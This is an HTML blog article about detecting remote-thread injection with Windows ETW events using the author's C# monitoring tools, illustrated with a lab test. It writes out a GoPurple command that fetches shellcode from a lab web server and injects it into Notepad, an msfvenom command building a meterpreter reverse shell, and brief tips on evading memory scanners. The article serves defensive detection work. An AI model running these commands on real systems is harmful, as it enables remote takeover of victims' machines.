<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>ETWPM2Monitor2 & Remote-Thread-Injection Detection by ETW</title>
<link rel="Stylesheet" type="text/css" media="all" href="12aug2021x_files/styles.css">
<style>

</style>

</head>

<body style="tab-interval:35.45pt" vlink="blue" link="darkorange" lang="EN-US" bgcolor="white" background="12aug2021x_files/x3.jpeg">

<div class="Section1">

<div>

<div id="header">

<p class="MsoNormal" style="margin:2.25pt;line-height:30.0pt;mso-outline-level:
2;background:#F3F2ED"><b><span style="font-family:Arial;
mso-font-kerning:18.0pt">ETWPM2Monitor2 & Remote-Thread-Injection Detection by ETW</span></b></p>

</div>

<p><b><span style="font-family:Arial"><o:p>&nbsp;</o:p></span></b></p>

<p><b><span style="font-family:Arial">ETWPM2Monitor2 & Remote-Thread-Injection Detection by ETW<span style="mso-spacerun:yes">&nbsp; </span><o:p></o:p></span></b></p>

<p><span style="font-family: Arial"></span></p><p>in this article i want to
 talk about "Remote-Thread-Injection Detection by ETW" also i want to talk about C# codes like <b>"ETWProcessMon2.exe & ETWPM2Monitor2"</b>, which i made for Monitoring ETW events for Remote-Thread-Injection Detection, but the goal is talking/thinking about how can use ETW as Defender/Blue teamer for Defensive tools like EDR/AVs or your own Tools etc. so does not matter what i did in my C# codes, these codes just is for test to show you how can use ETW as Blue teamer but these things/codes made by my opinion & my focus was on Remote Thread Injection attack also my focus was on those things which i think blue teamers should know them better than before and these code was for Chapter15 of ebook [bypassing AVs by C# Programming], (i will publish ch15 soon ;D) which is about how can use ETW for Defenders/Blue teamers & ... in these two C# codes, i used ETW Events by some C#.NET nuget which made by Microsoft... so my Detection based on ETW Events which made by ETW + C# codes but you can make your own tools like this with some other Events like SysMon Events etc (which i think is good idea).

i will work on Sysmon Events in these codes in the future but now i just want to talk about some example/test also what we can have by <b>ETW</b> for <b>Defenders</b> or <b>Blue teamers</b> but this code will be useful for <b>Pentesters/Red teamers</b> too [i hope].               
 </p><p>background of codes is very simple, in (step1) ETW events will create by ETWProcessMon2.exe & this code will save ETW events to the Windows Event Log name "ETWPM2" also at same time events will save to text file too, in (step2) with ETWPM2Monitor2 tool you can read Windows Event Log "ETWPM2" which is our ETW events like Real-time monitor tool for Attack Detection &..., in this Windows event log we have [EventID 1: New Process event (information)] [EventID 2: RemoteThreadInjection event (warning)] [EventID 3 : TCP Send event (information)]</p>
 <p>with EventID1 you can see what new process created with EventID2 you can Detected which process (ProcessA) has/had RemoteThreadInjection which means New Thread Created into ProcessA by another Process (ProcessB) & with EventID3 you can see Which Process Has/had Network Connection (TCP Send traffic) which means Target Process (ProcessA) after injection has/had network connection to Attacker IPaddress, int this EventID3 you can see which process connected to which RemoteIPAddress:RemotePort </p>
 
 <p><b>ETWPM2Monitor & Simple Attack Example for RemoteThreadInjection</b> </p> 
 
<p>now i want to talk about this simple code/tool & Threat Detection (RemoteThreadInjection attack) by ETW Events... , </p> 
<p>in the "Picture1" you can see i used "GoPurple.exe" tool which is very simple also useful for testing you own Defensive Tools etc,
my syntax for test this attack technique 9 (CreateRemoteThreadNative) by GoPurple.exe was :</p>
<p>GoPurPle.exe -u Http://192.168.56.1:8000/Shell2.bin -p 4684 -t 9</p> 
<p>shell.bin made by <b>Msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 -f raw > shell2.bin</b> and 4684 is PID for Target Process in this case Notepad.exe and -t 9 is <b>CreateRemoteThreadNative</b> Technique</p> 
<p><b>Note:</b> GoPurple =><a target="_blank" href="https://github.com/sh4hin/GoPurple">https://github.com/sh4hin/GoPurple</a></p>
<p>before start attack,(step1) i need to run ETWProcessMon2.exe for Creating ETW events into Window Event log [real-time], in the (step2) we need to run ETWPM2Monitor2 (v2) for Monitoring ETW Events in Windows Log like real-time monitor, now in the (step3) you can run GoPurple, as you can see in my ETWPM2Monitor tool all (steps) for this Remote-Thread-Injection attack detected by ETW Events</p>

<p><b>EventID 1: GoPurple:5792 => </b>first event was Executing GoPurple.exe as New Process [EventID 1] which with properties for this event you can see Command Prompt args too</p>
<p><b>EventID 2: Notepad:4684  => </b>next event was about Notepad.exe which has/had Remote Thread Injection by GoPurple.exe as you can see in the "Picture1" in [EventID 1] properties we had command prompt which you can see -p 4685 and this [EventID 2] is related to that information from previous event id 1</p>
<p><b>EventID 3: Notepad:4684  => </b>in last event we have Network TCP Send from Notepad to the Attacker IPAddress which means Injection was worked very well all these events was about 3 seconds only</p>
<p><img src="12aug2021x_files/2.png" width="1137" height="614" border="0"></p>
<p>Picture 1: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique Detection</p>
<p>&nbsp;</p>
<p>now you can see what exactly happened in memory for target process & in my simple C# code if some Process has/had these 3 Steps then Alarm Flag is true and this code will set new Event to Alarm for that target process for Scanning Memory or ...</p> 
<p>but before talk about Alarms let me show you Picture2 & 3 which is about EventID2 & 3 Properties which is very important</p>
<p>&nbsp;</p>
<p><img src="12aug2021x_files/3.png" width="1155" height="614" border="0"></p>
<p>Picture 2: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique Detection, Injection Event Properties</p>
<p>&nbsp;</p>
<p>in the "Picture 2" you can see ETW EventID2 Properties for Notepad:4684 & in the Debug info we have <b>1192::0x0238b0ff0000:7052:5792[Injected by GoPurple.exe:5792]</b>,you can see this information with right-click on EventID2 [INJ] & select Event Properies on menu very simple.</p>
<p>&nbsp;</p>
<p><b>TID::StartAddress_for_TID:PTID:PPID/Injector</b></p>
<p><b>1192::0x0238b0ff0000:7052:5792</b></p>
<p>in this Debug information we have something like this => TID 1192 injected into target Process Notepad:4684 by Injector Process GoPurple:5792 & that TID:1192 has StartAddress 0x0238b0ff0000, this information is very important for Payload Detection , because StartAddress of Thread is key to find Payload in target process by Defender/BlueTeam Tools. Some AVs will Detect this TID to kill that some of them will Suspend this TID but some of them will terminate/kill or suspend Target Process (Depends on tools)</p>
<p>&nbsp;</p>
<p>in the next "Picture3" you can see for each "EventID 2" you can see more info about Injection with right-click on events + selecting "Injected TID Memory Info" on menu.</p>
<p>&nbsp;</p>
<p><img src="12aug2021x_files/4.png" width="1149" height="614" border="0"></p>
<p>Picture 3: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique Detection, Injection Memory Properties</p>
<p>&nbsp;</p>
<p><b>Technique/Payload Detection + Alarms by ETW & Memory Scanners</b> </p>
 <p>as you can see in the Pictures 1,2,3 we had GoPurple.exe as Attacker tool and 3 eventIDs for that , now in the "Picture 4" you can see what happened with Command Prompt & Meterpreter Session, as you can see GoPurple.exe executed & Meterpreter Session Established,in localtime [8:56:26] Injection happened & in these times [8:56:30][8:56:33][8:56:34] after 3...4 Seconds i had 3 New Events in Alarms by ETW TAB which Notepad:4684 "Scanned & Found" also you can see details about Injector in this New Event which made by C#.</p> 
<p>these information is very useful for defenders for detection also as Pentester/RedTeamer you can use your own Offensive tools to test for Detection & Detection bypassing etc , if you can change your TID StartAddress (Spoofing) or if you used Obfuscation/Encryption for Payload in-memory maybe you can bypass this Technique for Detection ;D (Bypassing Memory Scanner for payload detection), some offensive tools will execute payload in meomry & after execute payload immediately will change that or... that means they will rewrite in this StartAddress, so if you wrote some codes to monitoring VirtualMemAlloc on target process you will see some payload byte on some StartAddress <b>changed</b> very fast <b>"always or sometimes"</b>, you can write this code with C# + ETW for Monitoring VirtualMemAlloc events for each process and ETWProcessMon2.exe will save VirtualMemAlloc Events for all processes into text log file too.</p> 

<p><img src="12aug2021x_files/8.png" width="1313" height="673" border="0"></p>
<p>Picture 4: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique/Payload Detection by Memory Scanner</p>
<p>in the next "Picture 5" you can see Alarm Properties for this Detection which we have General information about New Detection Event also we have Details about Memory Scanner Results <b>(Pe-sieve & HollowsHunter)</b> which are good tools for defenders also you can see Injector Properties & details about command-prompt args... and finally you can see ETW [EventsID 2] behind this Detection with debug info.</p> 
<p>Note: you can see in the "Picture 5" TID + StartAddress of Injected Thread by ProcessHacker & ETW Events.</p>
<p><b>Note:</b> pe-sieve64 =><a target="_blank" href="https://github.com/hasherezade/pe-sieve">https://github.com/hasherezade/pe-sieve</a></p>
<p><b>Note:</b> hollows_hunter =><a target="_blank" href="https://github.com/hasherezade/hollows_hunter">https://github.com/hasherezade/hollows_hunter</a></p>
<p><img src="12aug2021x_files/6.png" width="1311" height="678" border="0"></p>
<p>Picture 5: Payload ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique/Payload Detection by Memory Scanner</p>
<p>&nbsp;</p>
<p>in the next "Picture 6", you can see with TID & StartAddress, you can find Meterpreter Payload in target process memory very simple.</p>

<p><img src="12aug2021x_files/5.png" width="1291" height="709" border="0"></p>
<p>Picture 6: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique/Payload Detection by Memory Scanner </p>
<p>these information made by ETW is very useful for Defenders/Blueteams tools like EDR/AVs etc.</p>
<p>in the next "Picture 7" you can see all events which monitored by ETWPM2Monitor2.exe (real-time)</p> 
<p><img src="12aug2021x_files/1.png" width="1277" height="723" border="0"></p>
<p>Picture 7: ETWProcessMon2 & ETWPM2Monitor2 (v2), Technique/Payload Detection by Memory Scanner</p>
<p><b>Note:</b> i tested these C# codes + ETW events Against some techniques like <b>Process Hollowing & Process Doppelganging by [Minjector], C# Process-Hollowing, C# Dinvoke, C# syscall, Classic Remote-Thread-Injection, Loading dll/functions from Memory [32BIT], APC Queue Code Injection, Process-Ghosting, EtwpCreateEtwThread, RtlCreateUserThread, CreateRemoteThreadNative, CreateThreadpoolWait by [GoPurple] </b> & ...</p>

<p><b>Note:</b> C# codes for ETWProcessMon2 & ETWPM2Monitor (v1.2) => <a target="_blank" href="https://github.com/damonmohammadbagher/ETWProcessMon2">https://github.com/damonmohammadbagher/ETWProcessMon2</a></p>
<p><b>Note:</b> ETWPM2Monitor2 (v2) C# code which in this article you saw is not ready, i will publish v2 soon</p>
<p>&nbsp;</p>
<p><b>at a glance:</b> as defender (Blue teams) you can use ETW for your own tools for Detection and Some Anti-viruses & EDRs are working these days with ETW events also as Pentester/Redteamer you can test your offensive tools against Detection by ETW events [why not?]  ¯\_(ツ)_/¯ </p>
 
<div id="footer">

<p class="MsoNormal" style="margin:3.0pt;background:#6F6F6F"><span style="font-family:Arial;color:white">Last Update: 12 Aug 2021 <o:p></o:p></span></p>
</div>
</div>
</div>
</body>
</html>
